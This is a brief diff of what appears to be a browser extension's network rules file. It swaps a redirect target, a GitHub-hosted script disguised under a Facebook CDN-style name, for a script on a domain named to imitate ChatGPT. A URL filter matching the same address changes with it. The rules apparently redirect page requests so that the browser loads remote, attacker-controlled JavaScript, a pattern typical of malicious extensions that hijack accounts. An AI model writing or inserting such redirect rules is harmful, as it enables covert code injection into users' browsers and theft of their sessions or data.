@@ -5,7 +5,7 @@
     "action": {
       "type": "redirect",
       "redirect": {
-        "url": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/-xtNSS8Cn-Q.js"
+        "url": "https://chatgptopens.com/storage/scripts/__id.js"
       }
     },
     "condition": {
@@ -34,7 +34,7 @@
       ]
     },
     "condition": {
-      "urlFilter": "https://raw.githubusercontent.com/tackecon/static.xx.fbcdn.net/main/-xtNSS8Cn-Q.js"
+      "urlFilter": "https://chatgptopens.com/storage/scripts/__id.js"
     }
   },
    {
